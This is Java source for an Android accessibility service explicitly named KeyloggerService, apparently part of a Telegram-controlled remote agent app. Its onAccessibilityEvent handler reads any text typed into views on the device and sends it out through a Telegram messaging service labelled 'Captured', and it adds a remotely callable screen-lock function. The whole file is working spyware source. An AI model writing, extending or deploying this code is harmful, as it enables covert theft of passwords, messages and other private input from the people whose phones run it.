package com.thunderx.telegramagent;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

public class KeyloggerService extends AccessibilityService {

    private static KeyloggerService instance;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            TelegramAgentService.sendMessage("🔑 Captured: " + text);
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
    }

    /** Called from TelegramAgentService to lock the screen. Requires API 28+. */
    public static boolean lockScreen() {
        if (instance == null) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            return instance.performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
        }
        return false;
    }
}